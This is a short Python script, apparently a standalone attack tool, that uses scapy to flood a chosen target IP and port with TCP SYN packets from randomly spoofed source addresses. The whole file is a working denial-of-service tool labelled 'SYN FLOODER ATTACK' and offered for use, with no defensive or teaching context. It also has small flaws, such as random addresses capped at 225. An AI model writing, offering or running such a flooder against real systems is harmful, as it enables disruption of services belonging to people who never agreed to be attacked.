import argparse,socket
import random
from scapy.all import send, IP, TCP

pack = 9000
ports = 6000

socket = socket.socket()
def random_ip():
	IP = ".".join(map(str,(random.randint(0,225)for _ in range(4))))
	return IP

def get_args():
	parser = argparse.ArgumentParser(description="SYN FLOODER ATTACK\n")
	parser.add_argument('t')
	parser.add_argument('-a',type=int,default=pack)
	parser.add_argument('-p',type=int,default=80)
	args = parser.parse_args()
	return args.t, args.a, args.p

def SYN_FLOODER_ATTACK(target_ip,dport,packet_to_send):
	print('send packet')
	for i in range(packet_to_send):
		seq = random.randint(0,ports)
		sport = random.randint(0,ports)
		Windows = random.randint(0,ports)
		src = random_ip()
		packet = IP(dst=target_ip, src=src)/TCP(sport=sport,dport=dport,flags="S",seq=seq,window=Windows)
		send(packet,verbose="0")
	print('all packet send')

def main():

	target_ip,dport,packet_to_send = get_args()
	SYN_FLOODER_ATTACK(target_ip, dport, packet_to_send)

if __name__ == "__main__":
	main()
